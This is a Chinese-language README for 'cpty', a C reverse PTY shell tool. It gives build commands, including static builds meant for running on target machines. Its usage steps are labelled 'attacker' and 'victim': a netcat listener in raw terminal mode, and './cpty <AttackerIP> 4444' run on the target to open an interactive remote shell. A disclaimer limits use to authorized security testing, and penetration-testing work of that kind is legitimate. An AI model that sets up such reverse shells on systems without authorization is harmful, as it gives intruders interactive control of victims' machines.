# cpty - A "Perfect" Reverse PTY Shell

`cpty` 是一个用 C 语言编写的轻量级反向 PTY Shell 工具。它利用 `forkpty` 创建伪终端，提供了比传统反弹 Shell 更强大的交互体验，支持 `top`、`vim`、`su` 等交互式命令，并且能够正确处理 Ctrl+C/Z 等信号。

## ✨ 特性

- **完全交互式**: 支持 PTY，就像 SSH 一样使用。
- **信号传递**: 支持 Ctrl+C, Ctrl+Z 等快捷键传递到远程 Shell。
- **环境设置**: 自动设置 `TERM=xterm-256color`，支持彩色输出。
- **轻量级**: 代码精简，易于审计和修改。
- **静态编译友好**: 支持静态编译，方便在目标机器上直接运行。

## 🛠️ 编译

### 依赖
编译需要 `libutil` 库（通常包含在 glibc 中）。

### 1. 静态编译 (推荐)
静态编译生成的二进制文件体积稍大，但兼容性最好，无需目标机安装特定版本的 libc。

```bash
gcc -static -o cpty cpty.c -lutil
```

> **提示**: 如果使用 `musl-gcc` 进行静态编译，体积可以进一步压缩到 <50KB。

### 2. 普通编译 (动态链接)
依赖目标机的 libc 版本。

```bash
gcc -o cpty cpty.c -lutil
```

## 🚀 使用方法

### 1. 攻击者端 (Listening)
你需要将本地终端设置为 Raw 模式，以便正确处理特殊字符和信号。

```bash
# 开启监听，同时禁用本地回显，启用 Raw 模式
stty raw -echo; nc -lvp 4444; stty sane
```

**命令详解**:
- `stty raw -echo`: 将终端设置为 Raw 模式，不处理任何输入（如 Ctrl+C），直接透传给 nc。
- `nc -lvp 4444`: 监听 4444 端口。
- `stty sane`: nc 退出后，恢复终端的正常设置，防止终端乱码。

### 2. 受害者端 (Execution)
在目标机器上执行 `cpty`，连接攻击者的 IP 和端口。

```bash
./cpty <AttackerIP> 4444
```

### 3. 连接后的调整 (Window Size)
由于 TCP 协议不传输窗口大小信息，连接建立后，终端大小默认为 80x24。如果你的终端尺寸不同，可能会导致显示错乱（如 vim 显示不全）。

**解决方法**:
连接成功后，在 Shell 中手动设置当前窗口大小：

```bash
# 1. 在攻击者本地终端查看当前大小
stty size
# 输出例如: 40 120 (行 列)

# 2. 在反弹的 Shell 中设置
stty rows 40 cols 120
```

## ⚠️ 免责声明

本工具仅供安全研究和授权测试使用。严禁用于非法用途。使用者需自行承担因使用本工具而产生的一切法律责任。
